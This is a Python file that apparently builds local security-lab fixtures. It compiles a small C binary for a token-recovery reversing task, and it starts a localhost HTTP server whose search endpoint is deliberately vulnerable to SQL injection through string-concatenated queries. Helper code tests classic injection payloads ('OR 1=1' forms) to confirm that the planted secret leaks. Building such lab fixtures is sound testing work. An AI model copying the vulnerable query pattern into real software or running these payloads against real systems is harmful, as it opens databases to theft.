from __future__ import annotations

import json
import os
import select
import shutil
import socket
import sqlite3
import subprocess
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import urlencode, urljoin
from urllib.request import urlopen


REVERSE_TOKEN = "REVLAB-7C4D-LOCAL"
PENTEST_SECRET = "PENTEST-LAB-9F2A"

REVERSE_SOURCE = f'''#include <stdio.h>
#include <string.h>

static const char *expected_token = "{REVERSE_TOKEN}";

static int verify_candidate(const char *candidate) {{
    return candidate != NULL && strcmp(candidate, expected_token) == 0;
}}

int main(int argc, char **argv) {{
    if (argc != 2) {{
        puts("usage: target TOKEN");
        return 2;
    }}
    puts(verify_candidate(argv[1]) ? "TOKEN_OK" : "TOKEN_BAD");
    return verify_candidate(argv[1]) ? 0 : 1;
}}
'''

PENTEST_SERVER_SOURCE = r'''#!/usr/bin/env python3
from __future__ import annotations

import argparse
import json
import sqlite3
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlsplit


class Handler(BaseHTTPRequestHandler):
    db_path: Path

    def log_message(self, *_args):
        return

    def _send(self, payload, status=200):
        body = json.dumps(payload).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urlsplit(self.path)
        if parsed.path == "/health":
            self._send({"status": "ok"})
            return
        if parsed.path != "/search":
            self._send({"error": "not found"}, 404)
            return
        query = parse_qs(parsed.query).get("q", [""])[0]
        # Intentionally vulnerable local fixture: the query is concatenated.
        statement = "SELECT username, secret FROM secrets WHERE username = '%s'" % query
        with sqlite3.connect(self.db_path) as connection:
            try:
                rows = connection.execute(statement).fetchall()
            except sqlite3.Error as exc:
                self._send({"error": str(exc)}, 400)
                return
        self._send({"rows": rows})


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--db", required=True)
    parser.add_argument("--port", type=int, default=0)
    args = parser.parse_args()
    Handler.db_path = Path(args.db)
    server = ThreadingHTTPServer(("127.0.0.1", args.port), Handler)
    print(f"READY {server.server_address[1]}", flush=True)
    server.serve_forever()


if __name__ == "__main__":
    main()
'''


def build_reverse_fixture(workdir: Path) -> dict[str, object]:
    workdir.mkdir(parents=True, exist_ok=True)
    source = workdir / "reverse_target.c"
    binary = workdir / "reverse_target"
    source.write_text(REVERSE_SOURCE, encoding="utf-8")
    compiler = shutil.which("cc") or shutil.which("clang") or shutil.which("gcc")
    if compiler is None:
        raise RuntimeError("本地没有可用 C 编译器")
    result = subprocess.run(
        [compiler, "-O2", "-s", str(source), "-o", str(binary)],
        capture_output=True,
        text=True,
        timeout=30,
    )
    if result.returncode != 0:
        raise RuntimeError(f"合成逆向样本构建失败: {result.stderr.strip()}")
    binary.chmod(binary.stat().st_mode | 0o111)
    return {
        "source": source,
        "binary": binary,
        "expected_token": REVERSE_TOKEN,
        "build_command": [compiler, "-O2", "-s", str(source), "-o", str(binary)],
    }


def verify_reverse_token(binary: Path, candidate: str) -> bool:
    result = subprocess.run(
        [str(binary), candidate],
        capture_output=True,
        text=True,
        timeout=5,
    )
    return result.returncode == 0 and result.stdout.strip() == "TOKEN_OK"


@dataclass
class PentestServer:
    process: subprocess.Popen[str]
    base_url: str
    secret: str

    def stop(self) -> None:
        if self.process.poll() is None:
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.process.kill()
                self.process.wait(timeout=5)
        if self.process.stdout is not None:
            self.process.stdout.close()
        if self.process.stderr is not None:
            self.process.stderr.close()


def build_pentest_fixture(workdir: Path) -> dict[str, object]:
    workdir.mkdir(parents=True, exist_ok=True)
    server_source = workdir / "vulnerable_server.py"
    database = workdir / "lab.sqlite3"
    server_source.write_text(PENTEST_SERVER_SOURCE, encoding="utf-8")
    with sqlite3.connect(database) as connection:
        connection.execute("CREATE TABLE secrets (username TEXT, secret TEXT)")
        connection.execute("INSERT INTO secrets VALUES (?, ?)", ("lab-user", PENTEST_SECRET))
        connection.commit()
    return {"server_source": server_source, "database": database, "expected_secret": PENTEST_SECRET}


def start_pentest_server(fixture: dict[str, object]) -> PentestServer:
    process = subprocess.Popen(
        [sys.executable, str(fixture["server_source"]), "--db", str(fixture["database"]), "--port", "0"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        env={**os.environ, "PYTHONUNBUFFERED": "1"},
    )
    assert process.stdout is not None
    deadline = time.monotonic() + 10
    line = ""
    while time.monotonic() < deadline:
        remaining = max(0.05, deadline - time.monotonic())
        ready, _, _ = select.select([process.stdout], [], [], min(0.5, remaining))
        if ready:
            line = process.stdout.readline().strip()
            if line.startswith("READY "):
                port = int(line.split(" ", 1)[1])
                base_url = f"http://127.0.0.1:{port}/"
                return PentestServer(process, base_url, str(fixture["expected_secret"]))
        if process.poll() is not None:
            break
    stderr = process.stderr.read() if process.stderr else ""
    process.kill()
    process.wait(timeout=5)
    raise RuntimeError(f"本地渗透靶场启动失败: {line} {stderr.strip()}")


def query_pentest_server(base_url: str, payload: str) -> dict[str, object]:
    target = urljoin(base_url, "search?" + urlencode({"q": payload}))
    with urlopen(target, timeout=5) as response:
        return json.loads(response.read().decode("utf-8"))


def injection_proves_secret(base_url: str, secret: str) -> bool:
    payloads = ["' OR '1'='1", "' OR 1=1 -- "]
    for payload in payloads:
        try:
            result = query_pentest_server(base_url, payload)
        except Exception:
            continue
        rows = result.get("rows", []) if isinstance(result, dict) else []
        if any(isinstance(row, list) and secret in row for row in rows):
            return True
    return False
